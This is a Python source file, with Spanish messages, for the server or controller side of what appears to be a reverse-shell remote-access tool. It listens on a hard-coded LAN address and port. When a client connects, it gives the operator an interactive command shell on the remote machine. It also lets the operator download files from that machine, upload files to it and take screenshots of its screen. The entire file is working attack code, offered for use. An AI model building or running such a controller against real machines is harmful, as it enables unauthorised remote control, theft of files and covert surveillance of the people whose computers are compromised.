# netstat -an | findstr 57575 | findstr TCP | findstr LISTENING
# ipconfig /all | findstr /I ipv4
# Python 3.8
import atexit
import socket
import base64
import sys
import os



class Server:
	
	def __init__(self, LHOST, LPORT, download_path='downloads/', upload_path='uploads/', sc_path='screenshots/'):
		
		self.current_dir = None
		self.server = None
		self.client = None
		self.IP     = None
		self.LHOST  = LHOST
		self.LPORT  = LPORT
		self.LOCAL  = (self.LHOST, self.LPORT)
		self.sc_count = 0
		
		if not download_path.endswith('/'): download_path+='/'
		if not upload_path.endswith('/'):   upload_path+='/'
		if not sc_path.endswith('/'):       sc_path+='/'
		self.download_path = download_path
		self.upload_path   = upload_path
		self.sc_path       = sc_path
	
	def command_list(self):
		
		self.EXIT = ['exit', 'close', 'break']
		self.CLS  = ['cls', 'clear']
		self.DOWNLOAD = 'download'
		self.UPLOAD   = 'upload'
	
	def get_chunks(self, data, bfc=2**16):	# 2^16 = 65536 bytes = 64 kb, bfc = bytes for chunk
		
		parts = (len(data) // bfc)
		parts += 1 if (len(data) % bfc) else 0
		chunks = [ data[bfc*i:bfc*(i+1)] for i in range(parts) ]
		return chunks
	
	def chk_download_path(self):
		if self.download_path:
			if not os.path.isdir(self.download_path):
				os.mkdir(self.download_path)
		else:
			self.download_path = 'downloads/'
			if not os.path.isdir(self.download_path):
				os.mkdir(self.download_path)
	
	def chk_upload_path(self):
		if self.upload_path:
			if not os.path.isdir(self.upload_path):
				os.mkdir(self.upload_path)
		else:
			self.upload_path = 'uploads/'
			if not os.path.isdir(self.upload_path):
				os.mkdir(self.upload_path)
	
	def chk_sc_path(self):
		if self.sc_path:
			if not os.path.isdir(self.sc_path):
				os.mkdir(self.sc_path)
		else:
			self.sc_path = 'screenshots/'
			if not os.path.isdir(self.sc_path):
				os.mkdir(self.sc_path)
	
	def progress_bar(self, pos, chunks, qty=30, c=('█',' '), bfc=2**16): # bfc = bytes for chunk
		
		block = 100 / qty
		chunk = 100 / chunks
		
		percent  = chunk * pos
		progress = percent // block
		progress += 1 if percent % block > 0 else 0
		spaces   = qty - progress
		# ~ if pos == chunks: percent = 100
		bar = '{}% |{}{}|'.format(str(int(percent)).rjust(3),c[0]*int(progress), c[1]*int(spaces))
		
		return bar
	
	def shell(self):
		
		self.command_list()
		self.current_dir = self.client.recv(1024).decode()
		
		while True:
			
			try:
				command = input('{}~#: '.format(self.current_dir))
			except KeyboardInterrupt:
				command = 'exit'
				
			#===========================================================
			# Commands:
			
			if command.lower() in self.EXIT:
				self.client.send(self.EXIT[0].encode())
				print('\n Cerrando Conexion...')
				break
			elif command.lower().startswith('cd'):
				if len(command) > 2:
					self.client.send(command.encode())
					resp = self.client.recv(1024).decode('utf-8', 'ignore')
					if resp.startswith('No existe la ruta:'):
						print(resp)
					else:
						self.current_dir = resp
			elif command.lower().startswith(self.DOWNLOAD):
				self.chk_download_path()
				self.client.send(command.encode())
				res = self.client.recv(1024).decode('utf-8', 'ignore')
				if res == 'file does not exist':
					print('\n    Ese archivo no existe!\n')
				else:
					self.client.send('ok'.encode())
					file_name = command[len(self.DOWNLOAD):].strip()
					chunks = self.client.recv(1024).decode('utf-8', 'ignore')
					chunks = int(chunks.replace('Chunks: ',''))
					self.client.send('ok'.encode())
					data = ''.encode()
					print('')
					for i in range(chunks):
						chunk = self.client.recv(2**16)
						data += chunk
						bar = self.progress_bar(i+1, chunks)
						print('\r [+] Downloading: '+bar, end='')
						self.client.send('ok'.encode())
					with open(self.download_path+file_name, 'wb') as file_:
						file_.write(base64.b64decode(data))
						file_.close()
					print('\n\n  Descarga Completada! Archivo: '+file_name+'\n')
			elif command.lower().startswith(self.UPLOAD):
				self.chk_upload_path()
				file_name = command[6:].strip()
				if not os.path.isfile(self.upload_path+file_name):
					print('\n    No existe el Archivo \'{}\' en la carpeta Uploads!\n'.format(file_name))
				else:
					self.client.send(command.encode())
					self.client.recv(1024)
					with open(self.upload_path+file_name, 'rb') as file_:
						data = base64.b64encode(file_.read())
						chunks = self.get_chunks(data)
						chunks_len = len(chunks)
						info = 'Chunks: '+str(chunks_len)
						self.client.send(info.encode())
						self.client.recv(1024)
						print('')
						for i, chunk in enumerate(chunks):
							self.client.send(chunk)
							self.client.recv(1024)
							bar = self.progress_bar(i+1, chunks_len)
							print('\r [+] Uploading: '+bar, end='')
						print('\n\n  Subida Completada! Archivo: '+file_name+'\n')
						file_.close()
			elif command.lower().startswith('getweb'):
				self.client.send(command.encode())
				res = self.client.recv(1024).decode('utf-8', 'ignore')
				print(res)
			elif command.lower().startswith('showme'):
				print()
				if command[7:].lower() in ['', '/a', '/all', '-a', '--all', 'all']: 
					
					files = os.listdir(self.download_path)
					print(' Downloads.\n Archivos en Total: '+str(len(files))+'\n')
					for f in files: print(' [↓] '+f)
					print(' ________________________________\n')
					files = os.listdir(self.upload_path)
					print(' Uploads.\n Archivos en Total: '+str(len(files))+'\n')
					for f in files: print(' [↑] '+f)
					print(' ________________________________\n')
					files = os.listdir(self.sc_path)
					print(' Screenshots.\n Archivos en Total: '+str(len(files))+'\n')
				else:
					if command[7:].lower() in ['downloads','download','down','d','-d','--down','--download','--downloads','/d','/down','download','/downloads']:
						files = os.listdir(self.download_path)
						print(' Downloads.\n Archivos en Total: '+str(len(files))+'\n')
						for f in files: print(' [↓] '+f)
					elif command[7:].lower() in ['uploads','upload','up','u','-u','--up','--upload','--uploads','/u','/up','upload','/uploads']:
						files = os.listdir(self.upload_path)
						print(' Uploads.\n Archivos en Total: '+str(len(files))+'\n')
						for f in files: print(' [↑] '+f)
					elif command[7:].lower() in ['sc','screen','screenshot','screenshots']:
						files = os.listdir(self.sc_path)
						print(' Screenshots.\n Archivos en Total: '+str(len(files))+'\n')
					else:
						print('Comando desconocido...\n')
						continue
				print()
			elif command.lower().startswith('screenshot'):
				self.chk_sc_path()
				self.client.send(command.encode())
				res = self.client.recv(1024).decode()
				if res == 'Error':
					print('No se pudo tomar la captura de pantalla.')
					continue
				else:
					self.client.send('Ok'.encode())
				chunks = self.client.recv(1024).decode('utf-8', 'ignore')
				chunks = int(chunks.replace('Chunks: ',''))
				self.client.send('ok'.encode())
				data = ''.encode()
				print('')
				for i in range(chunks):
					chunk = self.client.recv(2**16)
					data += chunk
					bar = self.progress_bar(i+1, chunks)
					print('\r [+] Downloading: '+bar, end='')
					self.client.send('ok'.encode())
				file_name = 'sc_{}.png'.format(str(self.sc_count).zfill(3))
				while os.path.isfile(self.sc_path+file_name):
					self.sc_count += 1
					file_name = 'sc_{}.png'.format(str(self.sc_count).zfill(3))
				with open(self.sc_path+file_name, 'wb') as file_:
					file_.write(base64.b64decode(data))
					file_.close()
				print('\n\n  Descarga Completada! Screenshot: '+file_name+'\n')
				self.sc_count += 1
			elif command.lower() in self.CLS: os.system('cls')
			elif not command: pass
			else:
				self.client.send(command.encode())
				res = self.client.recv(2**16).decode('utf-8', 'ignore')
				if res == 'None':
					if command.startswith('mkdir'):
						print('\n    Carpeta \'{}\' creada con exito.\n'.format(command[5:].strip()))
				else:
					print(res)
			
			#===========================================================
	
	def up(self):
		
		self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		
		try: self.server.bind(self.LOCAL)
		except OSError:
			print('\n No se puede conectar con la dirección IP: '+str(self.LHOST))
			sys.exit()
		
		self.server.listen(1)
		
		print('\n [~] Corriendo servidor y esperando conexiones...')
		
		self.client, self.IP = self.server.accept()
		
		print('\n [+] Conexion recibida de:', self.IP[0], '\n')



@atexit.register
def close():
	if server.client:
		server.client.send(server.EXIT[0].encode())



if __name__ == '__main__':
	
	LHOST = '192.168.1.69'
	LPORT = 57575
	
	server = Server(LHOST, LPORT)
	server.up()
	server.shell()
	server.server.close()


